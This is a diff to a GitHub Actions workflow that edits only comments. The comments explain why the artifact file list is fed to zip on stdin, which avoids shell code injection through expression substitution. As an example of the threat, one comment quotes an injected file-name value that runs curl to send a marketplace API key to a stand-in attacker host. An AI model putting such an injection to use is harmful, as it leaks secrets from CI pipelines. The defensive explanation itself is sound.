@@ -173,7 +173,7 @@ jobs:
         # SECURITY:
         # - The list is written to `$RUNNER_TEMP/artifact-files.list` (one
         #   path per line) and consumed via `zip -@` (stdin file list),
-        #   NOT injected into the shell command via `${{ }}` substitution
+        #   NOT injected into the shell command via `<expr>` substitution
         #   — that pattern is a documented GitHub Actions code-injection
         #   sink (an attacker landing a `files[]` entry like
         #   `"x; curl evil.example/$MARKETPLACE_API_KEY"` would otherwise
@@ -311,7 +311,7 @@ jobs:
         run: |
           COMMIT_MESSAGE="$(git log -1 --pretty=%B "${{ github.sha }}")"
           # File list comes from stdin via `zip -@` — see the resolver
-          # step above for the security rationale (no `${{ }}` shell
+          # step above for the security rationale (no `<expr>` shell
           # injection sink, names with whitespace / quotes safe).
           # `--symlinks` stores symlinks rather than dereferencing
           # (defense-in-depth — the resolver already rejects external
